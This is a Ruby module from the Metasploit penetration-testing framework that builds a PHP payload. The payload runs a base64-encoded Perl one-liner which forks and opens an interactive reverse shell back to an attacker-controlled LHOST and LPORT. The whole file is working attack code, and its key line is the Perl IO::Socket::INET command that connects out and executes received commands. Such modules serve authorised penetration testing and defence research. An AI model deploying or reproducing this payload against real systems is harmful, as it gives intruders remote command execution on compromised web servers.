##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'PHP Command, Double Reverse TCP Connection (via Perl)',
        'Description' => 'Creates an interactive shell via perl',
        'Author' => 'cazz',
        'License' => BSD_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vars = Rex::RandomIdentifier::Generator.new
    dis = "$#{vars[:dis]}"
    shell = <<-END_OF_PHP_CODE
              #{php_preamble(disabled_varname: dis)}
              $c = base64_decode("#{Rex::Text.encode_base64(command_string)}");
              #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
    END_OF_PHP_CODE
    return super + shell
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    ver = Rex::Socket.is_ipv6?(datastore['LHOST']) ? '6' : ''
    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
  end
end
